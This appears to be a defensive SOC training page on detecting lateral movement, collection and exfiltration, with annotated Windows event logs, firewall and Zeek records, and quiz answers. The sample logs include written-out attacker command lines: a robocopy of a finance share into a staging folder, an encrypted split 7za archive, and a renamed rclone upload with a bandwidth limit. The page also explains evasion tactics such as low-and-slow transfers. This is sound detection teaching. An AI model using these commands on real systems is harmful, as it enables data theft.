Ingredient How they get it ATT&CK Access to the remote host An exploit against a network service (e.g. an unpatched SMB or RDP flaw) T1210 Exploitation of Remote Services Legitimate credentials — stolen passwords, hashes or tickets (by far the most common) T1078 Valid Accounts, T1550 Use Alternate Authentication Material Code to run there Built-in commands (cmd, PowerShell, net, reg, wmic…) — nothing to bring (various, e.g. T1059) Their own malware or tools — copied to the host or put on a share it can reach T1570 Lateral Tool Transfer

When attackers copy their tools onto a host, they like places nobody looks: temporary folders, C:\ProgramData, C:\Users\Public, and even the Recycle Bin (C:\$Recycle.Bin\<SID>\), which is hidden and system-like. A file-creation event in such a path, written over SMB from another machine, is a classic sign:

Event ID: 11   File created
UtcTime:        2026-11-18 03:41:09.220
Image:          System
TargetFilename: C:\$Recycle.Bin\S-1-5-21-1111111111-2222222222-3333333333-1104\$RX2K9QF.exe
User:           NT AUTHORITY\SYSTEM
  • Event ID 11 — Sysmon "file created".
  • Image System — the file was written by the kernel's SMB server (the System process, PID 4), i.e. it arrived over the network from another machine, not from a local program.
  • TargetFilename C:\$Recycle.Bin\…\$RX2K9QF.exe — an executable inside a user's Recycle Bin folder. Real deleted files are renamed $R… with their original extension, but nothing legitimately delivers an .exe into the Recycle Bin over SMB.

docs.title: The protocols attackers borrow
docs.text:
Here is the uncomfortable part: lateral movement is easy, because every operating system ships with good tools for controlling one machine from another. They exist so admins don't have to walk to each server — and they work just as well for anyone holding the right credentials.

Need Protocol / method Port ATT&CK What it looks like on the target Command line SMB + remote service (PsExec style) TCP 445 T1021.002 + T1569.002 4624 type 3 → 5145 ADMIN$ → 7045 new service → services.exe starts the payload Command line WMI TCP 135 + high dynamic port T1047 4624 type 3 → WmiPrvSE.exe starts cmd.exe/powershell.exe Command line PowerShell remoting / WinRM TCP 5985/5986 T1021.006 4624 type 3 → wsmprovhost.exe runs the commands Command line SSH TCP 22 T1021.004 sshd "Accepted …" in auth.log/journal; on Windows OpenSSH its own log GUI RDP TCP/UDP 3389 T1021.001 1149, 4624 type 10, rdpclip.exe, a new desktop session GUI VNC TCP 5900+ T1021.005 The VNC server's own log; often no Windows logon event at all GUI X11 forwarding (Linux) over SSH T1021.004 An SSH session with X11 forwarding requested

The network side of each protocol is covered in SMB, SSH, RDP and VNC and PowerShell remoting, FTP and ICMP. Here we look at what the target host records.

docs.title: On the target: SMB + a remote service (PsExec style)
docs.text:
The PsExec pattern has three steps: log in over SMB, copy a program into the hidden admin share ADMIN$ (= C:\Windows), and ask the remote Service Control Manager to create and start a service that runs it. Each step leaves an event on the target:

EventID:                   4624
Computer:                  FS-FIN-02.corp.example
LogonType:                 3
TargetUserName:            c.ito
TargetDomainName:          CORP
LogonProcessName:          NtLmSsp
AuthenticationPackageName: NTLM
WorkstationName:           SRV-APP-07
IpAddress:                 10.20.4.37
TargetLogonId:             0x9A41C2
  • 4624 — "an account was successfully logged on". It fires on the machine being logged on to.
  • LogonType 3 — a network logon: the user didn't sit down or RDP; something connected to a service (here SMB).
  • TargetUserName c.ito — the account used. Is this person ever supposed to touch a finance file server from an application server?
  • AuthenticationPackageName NTLM — NTLM rather than Kerberos; between domain machines that is worth a second look (pass-the-hash forces NTLM — see Credential Dumping).
  • WorkstationName SRV-APP-07 / IpAddress 10.20.4.37 — the source of the hop.
  • TargetLogonId 0x9A41C2 — the session ID; every following event in this session carries the same value, so you can chain them.
EventID:            5145
Computer:           FS-FIN-02.corp.example
SubjectUserName:    c.ito
SubjectLogonId:     0x9A41C2
ShareName:          \\*\ADMIN$
ShareLocalPath:     \??\C:\Windows
RelativeTargetName: svcupd.exe
AccessMask:         0x2
IpAddress:          10.20.4.37
  • 5145 — "a network share object was checked to see whether the client can be granted desired access". It is produced only if Detailed File Share auditing is enabled (it is noisy, so many places don't — check yours).
  • SubjectLogonId 0x9A41C2 — the same session as the 4624 above.
  • ShareName \\*\ADMIN$ / ShareLocalPath C:\Windows — the hidden administrative share. Normal users never write here.
  • RelativeTargetName svcupd.exe — the file being written into C:\Windows.
  • AccessMask 0x2 — WriteData: the client is writing a file, not just reading.
Log Name:     System
Source:       Service Control Manager
EventID:      7045
Service Name: svcupd
Image Path:   %SystemRoot%\svcupd.exe
Service Type: user mode service
Start Type:   demand start
Account Name: LocalSystem
  • 7045 — "a service was installed in the system" (System log). The Security log equivalent is 4697, if "Security System Extension" auditing is on.
  • Image Path %SystemRoot%\svcupd.exe — the file just dropped via ADMIN$. The genuine PsExec tool uses a service named PSEXESVC; clones and attack frameworks use random or harmless-sounding names, so don't key on the name.
  • Start Type demand start + Account Name LocalSystem — started on request, running as SYSTEM. A brand-new on-demand SYSTEM service whose binary arrived over SMB seconds earlier is the PsExec signature.

Then 4688/Sysmon 1 shows services.exe → svcupd.exe → cmd.exe. Line all four up by time and logon ID and the hop is proven. Deeper detail: PsExec over SMB.

docs.title: On the target: WMI and PowerShell remoting
docs.text:
With WMI there is no file copy and no service. The target's WMI provider host simply starts the command:

EventID:            4688
Computer:           FS-FIN-02.corp.example
SubjectUserName:    c.ito
NewProcessName:     C:\Windows\System32\cmd.exe
CommandLine:        cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1763437302.41 2>&1
ParentProcessName:  C:\Windows\System32\wbem\WmiPrvSE.exe
  • ParentProcessName …\WmiPrvSE.exe — the WMI provider host. On a server it legitimately starts very few shells; WmiPrvSE.exe → cmd.exe/powershell.exe is the WMI lateral-movement shape (T1047).
  • CommandLine cmd.exe /Q /c whoami — /Q turns echo off, /c runs one command and exits.
  • 1> \\127.0.0.1\ADMIN$\__1763437302.41 2>&1 — writes the output into a file in ADMIN$ on itself (127.0.0.1) so the remote attacker can read it back over SMB. A timestamp-like file name under ADMIN$ is a well-known pattern of common attack toolkits.

PowerShell remoting runs commands inside a host process on the target:

EventID:            4688
NewProcessName:     C:\Windows\System32\wsmprovhost.exe
CommandLine:        C:\Windows\system32\wsmprovhost.exe -Embedding
ParentProcessName:  C:\Windows\System32\svchost.exe
SubjectUserName:    c.ito
  • wsmprovhost.exe — the WinRM plug-in host; one appears per remote PowerShell session. Anything it spawns, and every script block it runs (PowerShell 4104, see Execution, Persistence and Discovery), belongs to the remote user. The Microsoft-Windows-WinRM/Operational log on the target also records the session being created. Deeper detail: WMI and WinRM.

docs.title: On the target: RDP and SSH
docs.text:
RDP leaves events in two places:

Log Name:  Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational
EventID:   1149
User:      c.ito
Domain:    CORP
Source Network Address: 10.20.4.37

EventID:          4624
LogonType:        10
TargetUserName:   c.ito
IpAddress:        10.20.4.37
LogonProcessName: User32
  • 1149 — "Remote Desktop Services: user authentication succeeded". It records the network connection being authenticated, with the source address — useful even when the Security log has rolled over.
  • 4624 LogonType 10 — RemoteInteractive: a full desktop session. (On recent Windows with Network Level Authentication you may also see a type 3 just before it.) Type 10 means the user's credentials are now in this host's memory, ready for the next dump — the chain from the previous page.

On Linux, SSH logins land in /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL family), or only in the systemd journal on newer systems:

Nov 18 03:52:14 db-cust-01 sshd[48211]: Accepted publickey for svc_backup from 10.20.4.37 port 51522 ssh2: ED25519 SHA256:k3Vq...redacted
  • Nov 18 03:52:14 — local timestamp (no year, no time zone — a classic syslog limitation).
  • db-cust-01 — the host that logged it; sshd[48211] — the SSH daemon process and its PID.
  • Accepted publickey — login succeeded with a key, not a password. Attackers who find private keys in a compromised user's ~/.ssh/ use exactly this.
  • for svc_backup from 10.20.4.37 port 51522 — the account, and where it came from. A backup service account logging in interactively at 03:52 from an application server is the lead.
  • ED25519 SHA256:k3Vq… — the fingerprint of the key used. Match it against authorized_keys to see which key — and therefore which stolen copy — was used.

[Supplement] The simplest lateral-movement detection: who normally talks to whom

In most networks, workstations don't log on to other workstations, and normal users don't RDP to servers. Admins connect from a small set of admin machines or jump hosts. So a baseline of "source host → destination host → account → logon type" catches a lot: a 4624 type 3 or 10 between two user laptops, an account logging on to many hosts within minutes (fan-out), or a new source for a privileged account. The same idea works on the network with Zeek conn.log or flow data: count distinct internal destinations on ports 445, 135, 5985, 3389 and 22 per source, per hour.

docs.title: What gets collected
docs.text:
Each time a new host is reached, the attacker searches it for anything useful: more credentials, intellectual property, personal data, financial records, or simply information that helps the next step. ATT&CK's Collection (TA0009) tactic lists the usual targets:

What ATT&CK Typical evidence Files on the host T1005 Data from Local System Burst of file reads (4663 if auditing that folder; EDR file events), dir /s, findstr searches Files on shares T1039 Data from Network Shared Drive Burst of 5145/5140 on the file server from one account and one source Screenshots / video T1113 Screen Capture, T1125 Video Capture Unusual process loading screen-capture APIs, image files appearing in temp folders Keystrokes T1056.001 Keylogging Code hooking keyboard input; small log files that grow steadily Email T1114 Email Collection Mailbox export, PST files on disk, unusual mailbox access in cloud audit logs Databases / repositories T1213 Data from Information Repositories (and T1005) sqlcmd/bcp/mysqldump command lines, very large query results Getting it ready to leave T1074 Data Staged (.001 local, .002 remote), T1560 Archive Collected Data Large archives appearing in ProgramData, Temp, Public, or on a "staging" host

How much the attacker can collect depends on the privileges of the account they hold on each machine. That's why the steps repeat in a loop:

   lateral movement --> privilege escalation --> credential dumping
          ^                                             |
          |                                             v
          +------------------- collection <-------------+
                  (until the target data is reached, then: stage -> exfiltrate)

docs.title: A collection burst on a file server
docs.text:
A human user opens a handful of files from a share. A collection script walks the entire tree. On the file server, that difference is visible if share auditing is on:

03:58:02  5145  c.ito  10.20.4.37  \\*\Finance  2026\Q3\payroll_q3.xlsx            0x1 (ReadData)
03:58:02  5145  c.ito  10.20.4.37  \\*\Finance  2026\Q3\payroll_q3_draft.xlsx      0x1 (ReadData)
03:58:03  5145  c.ito  10.20.4.37  \\*\Finance  2026\Q3\bank_details.csv           0x1 (ReadData)
...       (3,914 more in 6 minutes)
04:04:11  5145  c.ito  10.20.4.37  \\*\Finance  Archive\2019\audit\ledger.xlsx     0x1 (ReadData)
  • Columns: time, event ID, account, source IP, share, relative path, access mask.
  • Same account, same source, thousands of files in minutes, walking from current folders back into old archives — nobody reads that way. 0x1 (ReadData) on everything means the files are being read in full, i.e. copied.
  • The source 10.20.4.37 is SRV-APP-07 — the host from the earlier hops. Collection is often run from the foothold across the network.

The matching endpoint view is often a single copy command into a staging folder:

EventID:           4688
Computer:          SRV-APP-07.corp.example
SubjectUserName:   c.ito
NewProcessName:    C:\Windows\System32\Robocopy.exe
CommandLine:       robocopy \\FS-FIN-02\Finance C:\ProgramData\cache\f /E /MT:4 /R:0 /W:0 /NFL /NDL /NJH
ParentProcessName: C:\Windows\System32\cmd.exe
  • robocopy \\FS-FIN-02\Finance C:\ProgramData\cache\f — copy the whole Finance share into an innocent-looking folder under ProgramData (T1039 + T1074.001).
  • /E — include all subfolders. /MT:4 — 4 threads (faster). /R:0 /W:0 — don't retry locked files, don't wait.
  • /NFL /NDL /NJH — no file list, no directory list, no job header: suppress the output that would show what was copied. Quiet flags are typical of scripted theft.

docs.title: Why getting data out is harder than reading it
docs.text:
Reading a database is one thing; carrying a copy of it out of the building is another. The burglar on the twelfth floor can look at every document in the safe, but walking out of reception with forty boxes of paper is a different problem.

The attacker's constraints:

  1. Volume. Valuable data is often big — gigabytes or terabytes.
  2. Servers can't reach the internet. Good practice blocks internal servers from talking straight to the internet, so the data can't be sent from where it lives.
  3. So it must be moved inside first — copied to a staging host (a workstation or server that can get out). That internal move is itself detectable.
  4. They need an open path out: an allowed destination, port and protocol through the border firewall.
  5. They want to hide the content, so that if the transfer is seen, nobody can tell what was taken.
  6. They must go slowly, so the host doesn't appear on "top uploaders" lists from flow data, or trip IDS, DLP or firewall thresholds.

docs.title: The typical sequence
docs.text:
Internet
                                       ^
                                       |  (4) many small encrypted pieces,
                                       |      slowly, through an allowed path
   +-----------------+   (2) access    |
   |  DB server      |<---------+      |
   | (no internet)   |          |      |
   +--------+--------+   +------+------+------+
            |            |  Infected host     |  (1) attacker has interactive
            +----------->|  (foothold, C2)    |      C2 on this machine
          (3) copy of    +--------------------+
              the data staged here
  1. Interactive control. The attacker has a working command-and-control channel to a victim machine and credentials or exploits that reach the data.
  2. Access the data from that machine — over Windows file sharing, an SSH session, a database client, whatever reaches it.
  3. Stage a copy back on the controlled machine (or another one that can reach the internet). This step exists precisely because the database server can't reach the internet directly.
  4. Prepare and send. Compress, encrypt and split into pieces, then leak them out slowly.

docs.title: Compress, encrypt, split — and why the command line matters
docs.text:
Archiving tools that support passwords and multi-part volumes do all three jobs at once (T1560.001 Archive via Utility):

EventID:           4688
Computer:          SRV-APP-07.corp.example
SubjectUserName:   c.ito
NewProcessName:    C:\ProgramData\cache\7za.exe
CommandLine:       7za.exe a -t7z -mx9 -mhe=on -p[redacted] -v95m C:\ProgramData\cache\upd.7z C:\ProgramData\cache\f\*
ParentProcessName: C:\Windows\System32\cmd.exe
  • 7za.exe from C:\ProgramData\cache\ — the stand-alone command-line build of a popular archiver, brought in by the attacker (it isn't installed there).
  • a — add files to an archive. -t7z — 7z format.
  • -mx9 — maximum compression: smaller total size = fewer bytes to sneak out.
  • -mhe=on — encrypt the headers too, so even the file names inside the archive are hidden. Without this, a captured archive still reveals which files are inside.
  • -p[redacted] — the archive password. In real logs it appears in clear text in the command line — if you recover the pieces later, this may let you open them and see exactly what was stolen.
  • -v95m — split into 95 MB volumes (upd.7z.001, upd.7z.002, …): small enough to send one at a time, under typical upload-size alerts.
  • …\f\* — the input: the staging folder filled by the robocopy above.

Why the attacker bothers:

  • Smaller: compression shrinks the data — fewer bytes, less time on the wire.
  • Pieces: no single giant transfer; each piece looks like an ordinary upload.
  • Hidden content: even if your network captures every packet, you see only encrypted blobs. The only record of what left may be this one command line (and the files it read). That is a strong argument for process-creation logging with command lines everywhere — covered in detail in the Important Events section.

docs.title: Finding a way out
docs.text:
Encrypted pieces still need a path out: a destination (IP or domain), a destination port and an application protocol. On a network with a default-deny outbound policy — which, unfortunately, not every organisation has — most options are already closed.

Imagine a border firewall that allows only:

  • TCP 25 (SMTP) — and only from the mail server,
  • TCP 80/443 (HTTP/HTTPS) — and only from the web proxy.

From the staging host, the attacker first has to discover this — often by trial and error, which leaves deny logs:

2026-11-18T04:20:51Z fw-edge-01 action=deny proto=tcp src=10.20.4.37 sport=50112 dst=203.0.113.50 dport=22  rule=default-deny-out
2026-11-18T04:20:52Z fw-edge-01 action=deny proto=tcp src=10.20.4.37 sport=50113 dst=203.0.113.50 dport=21  rule=default-deny-out
2026-11-18T04:20:52Z fw-edge-01 action=deny proto=tcp src=10.20.4.37 sport=50114 dst=203.0.113.50 dport=443 rule=default-deny-out
2026-11-18T04:20:53Z fw-edge-01 action=deny proto=udp src=10.20.4.37 sport=50115 dst=203.0.113.50 dport=53  rule=default-deny-out
  • action=deny … rule=default-deny-out — the default "block everything not explicitly allowed" rule fired.
  • src=10.20.4.37 — an internal server trying to connect directly to the internet. Servers shouldn't — that's why it was blocked.
  • dst=203.0.113.50 with dport 22, 21, 443, 53 one second apart — the same external host tried on several ports in a row: someone probing for an open path. Even 443 was denied because only the proxy may use it.

A run like this is one of the cheapest, earliest exfiltration signals you will ever get. Many SOCs don't alert on outbound denies at all; they should at least alert on internal servers producing them.

Once the attacker realises only the proxy gets out, they use the correct protocol on the allowed port — HTTPS through the proxy, to a cloud storage service, a file-sharing site or their own server. Now content inspection mostly can't help (it's TLS, and the data is encrypted inside anyway). What's left:

  • Destination — a new or rare domain, a newly registered domain, a personal cloud-storage account, an IP with no reputation (Domain signals, Files, frequency and naked IPs).
  • Volume and direction — normal browsing downloads much more than it uploads. Exfiltration flips that:
ts             uid       id.orig_h   id.resp_h     id.resp_p proto service duration  orig_bytes  resp_bytes
1763441245.10  CzQ81e3a  10.20.9.15  198.51.100.77 443       tcp   ssl     1834.22   99614201    48122
  • id.orig_h 10.20.9.15 — the proxy (the connection to the internet starts there); proxy logs tell you which internal client asked for it.
  • id.resp_h 198.51.100.77:443 — the external destination.
  • duration 1834.22 — a single connection open for about 30 minutes.
  • orig_bytes 99614201 — about 95 MB sent out (≈ one archive volume), against resp_bytes 48122 (~47 KB back). A 2,000-to-1 upload ratio is not browsing.
  • Timing — repeated uploads of similar size at regular intervals, or always at night (T1029 Scheduled Transfer), each under a size threshold (T1030 Data Transfer Size Limits).

[Supplement] Low and slow — the arithmetic

Why "slowly" works: 40 GB sent at 2 MB/s takes about 5.7 hours and puts the host at the top of any upload chart. The same 40 GB at 200 KB/s takes about 2.4 days — but in any one hour it moves only ~700 MB, which can hide among normal backups and cloud sync. That's why per-host cumulative upload over days, not just per-hour peaks, is worth tracking.

A common real-world shape is a legitimate cloud-sync or file-transfer tool used by the attacker (ReliaQuest and others have reported tools such as Rclone, WinSCP and cURL as frequent exfiltration choices). The command line gives it away:

EventID:           4688
NewProcessName:    C:\ProgramData\cache\svhelper.exe
OriginalFileName:  rclone.exe
CommandLine:       svhelper.exe copy C:\ProgramData\cache\ remote01:bkp-2026 --include "upd.7z.*" --bwlimit 200k --transfers 1 --config C:\ProgramData\cache\s.conf
SubjectUserName:   c.ito
  • NewProcessName svhelper.exe but OriginalFileName rclone.exe — renamed binary. The original name is embedded in the file's version information (Sysmon 1 shows OriginalFileName); a mismatch is a red flag on its own.
  • copy C:\ProgramData\cache\ remote01:bkp-2026 — copy the staging folder to a cloud storage target defined in the config file.
  • --include "upd.7z.*" — only the archive volumes from the 7za step.
  • --bwlimit 200k — limit bandwidth to 200 KB/s: low and slow, written right into the command.
  • --transfers 1 — one file at a time, to look like a single normal connection.
  • --config …\s.conf — the destination account and credentials live in this file; collect it during the investigation — it tells you where the data went.

ATT&CK names the main exit routes: T1041 Exfiltration Over C2 Channel (through the existing command-and-control connection), T1048 Exfiltration Over Alternative Protocol (e.g. FTP, DNS — see DNS abuse), T1567 Exfiltration Over Web Service (e.g. .002 to cloud storage, .004 over webhooks such as chat or automation services), and T1537 Transfer Data to Cloud Account.

docs.title: Endpoint attack tactics — section summary
docs.text:
Looking back over this section, an intrusion splits into two big phases using the kill-chain stages:

Phase Kill-chain stages Best seen from What the attacker does Pre-exploitation 1 Reconnaissance, 2 Weaponisation, 3 Delivery, 4 Exploitation Mostly network (email, web, perimeter) Find a target, build the lure or exploit, deliver it, get code running Post-exploitation 5 Installation, 6 Command and Control, 7 Actions on Objectives Mostly host (process, logon, file, registry events) Execution, persistence, discovery, privilege escalation, credential access, lateral movement, collection, exfiltration

ATT&CK concentrates on the post-exploitation half and breaks it into tactics (the why: Persistence, Lateral Movement, Exfiltration…), each achieved by many techniques (the how). Studying that matrix tells you both what to expect and where each technique leaves evidence.

Post-exploitation is where detection matters most: the attacker is inside and making steady progress towards the goal, and most of these techniques are only clearly visible on the host. Network data shows that SRV-APP-07 talked SMB to FS-FIN-02; the host data shows c.ito logging on, a service being created, robocopy walking the Finance share and 7za encrypting the result. That is why the next section turns to endpoint defence in depth — controls and telemetry that catch the attacker as early in this sequence as possible.

docs.title: The 2026 view
docs.text:
[2026 Current] Still valid

The model on this page still describes most hands-on intrusions and ransomware cases: a foothold, credential theft, lateral movement over legitimate remote-administration protocols (SMB/remote services, WMI, WinRM, RDP, SSH), collection into a staging folder, archiving, and exfiltration through whatever path is allowed. The detection points — target-side logon plus parent process, new services, share-access bursts, archiver command lines, outbound denies, upload volume and ratio — are still the core of lateral-movement and exfiltration detection. Default-deny outbound and keeping servers off the internet are still among the most effective controls.

[Changed] What has changed

  • Data theft is often the whole point now. Ransomware groups increasingly steal data first ("double extortion") and some skip encryption entirely and extort with the stolen data alone. Industry reporting through 2025–2026 (for example from Google Threat Intelligence) describes this shift. Exfiltration is no longer a side effect; for many incidents it is the impact.
  • Legitimate tools and cloud services are the default exit. Attackers favour renamed sync and transfer tools (Rclone, WinSCP, cURL and similar) and mainstream cloud storage, file-sharing and webhook services over custom protocols — so destination allow-listing, cloud-app control (CASB) and OriginalFileName/signature checks matter more than port rules.
  • Lateral movement also happens in the cloud. In hybrid environments, stolen session tokens and cloud admin roles let attackers move between SaaS apps, cloud consoles and on-premises systems without touching SMB at all (ATT&CK T1021.007 Cloud Services, T1550.001 Application Access Token). Cloud audit logs (Entra ID sign-ins, unified audit log, cloud trail logs) are part of lateral-movement detection now.
  • Remote management tools. Commercial remote-access/RMM software (see Remote tools) is now one of the most common ways attackers move and keep control (T1219 Remote Access Tools) — it looks like IT support and often bypasses Windows logon telemetry.
  • Windows defaults are tightening (e.g. SMB signing required by default on Windows 11 24H2 and Windows Server 2025, NTLM being phased out), which raises the bar for relay and pass-the-hash — but not for an attacker with a valid password or ticket.

[Caution] Where the old way is wrong or risky today

  • Don't look for lateral movement only on the network. Encrypted SMB 3, WinRM over HTTPS and RDP hide the content; the target host's 4624 + parent process + 7045 is where the proof is. Make sure 5145 (or EDR equivalents) and command-line logging are actually enabled — they are off by default.
  • Don't key on tool names. PSEXESVC, rclone.exe, 7z.exe are trivially renamed. Detect the shape: new SYSTEM service from a file just written to ADMIN$, WmiPrvSE.exe spawning a shell, OriginalFileName mismatches, archives created with header encryption and volume splits.
  • Don't treat "allowed traffic" as safe. Most real exfiltration uses HTTPS on 443 through the proxy to a reputable cloud service. Track upload volume, ratio and destination per host over days, and alert on internal servers that ever try to reach the internet directly.
  • Don't rely on full packet capture to tell you what was stolen. The data will be encrypted; preserve the endpoint (command lines, staging folders, archive config files) before cleaning up, because that is where the answer is — and it may decide your breach-notification obligations.

docs.title: Question 1
docs.text:
On FS-FIN-02 you find, within ten seconds: a 4624 type 3 for c.ito from 10.20.4.37 using NTLM; a 5145 with ShareName \\*\ADMIN$, RelativeTargetName svcupd.exe, AccessMask 0x2; and a 7045 for a new service svcupd with image %SystemRoot%\svcupd.exe, demand start, LocalSystem. What happened, which ATT&CK techniques fit, and what do you check next?

Answer and explanation

This is PsExec-style lateral movement: someone logged on over the network as c.ito (4624 type 3), wrote an executable into C:\Windows through the hidden admin share (5145, WriteData on ADMIN$), then created an on-demand service running as SYSTEM pointing to that file (7045). Techniques: T1021.002 SMB/Windows Admin Shares, T1569.002 Service Execution, T1570 Lateral Tool Transfer, and T1078 Valid Accounts (or T1550.002 if pass-the-hash — the NTLM package supports that suspicion).

Next: check 4688/Sysmon 1 for services.exe → svcupd.exe → children to see what ran; hash and collect svcupd.exe; pivot to the source 10.20.4.37 (SRV-APP-07) to find how c.ito was obtained (credential dumping there); search all hosts for other 4624s from that source and other new services; treat c.ito as compromised and reset it.

docs.title: Question 2
docs.text:
Why do attackers usually compress, encrypt and split data before exfiltrating it, and what does that mean for the SOC?

Answer and explanation

Compression reduces the number of bytes to move. Splitting into volumes (e.g. 95 MB each) lets them send small pieces slowly, staying under upload-size and "top talker" thresholds instead of one giant transfer. Encryption (with header encryption, also the file names) means that even if the SOC captures the traffic, it can't see what was taken.

For the SOC: content inspection and packet capture won't reveal what was stolen, so process-creation logs with command lines become crucial — the archiver's command line shows the input folders and may even contain the password. Investigators should preserve the staging folder, archive volumes and tool configuration files. Detection shifts to behaviour: archive creation by unusual tools in odd folders, large internal copies to a staging host, and outbound upload volume, ratio, timing and destination.

docs.title: Question 3
docs.text:
Your border firewall is default-deny outbound; only the mail server may use port 25 and only the web proxy may use 80/443. An analyst says "so exfiltration can't happen here". What is wrong with that, and what should you monitor?

Answer and explanation

Default-deny outbound removes most direct routes and forces the attacker through narrow, monitored paths — a big win — but it doesn't stop exfiltration. The attacker can send data through the proxy over HTTPS like any user (to cloud storage, file-sharing sites, webhooks), use the existing C2 channel, or abuse DNS if internal resolvers forward to the internet. Using the expected protocol on an allowed port defeats port-based rules.

Monitor: outbound deny logs, especially from internal servers (early sign of someone probing for a way out); proxy and flow data for upload volume, upload/download ratio, long-lived connections and regular timing, per host over days; new or rare destinations and personal cloud-storage accounts; DNS for tunnelling patterns; and on endpoints, renamed transfer tools (OriginalFileName mismatches), archivers with password and volume options, and big internal copies into staging folders.
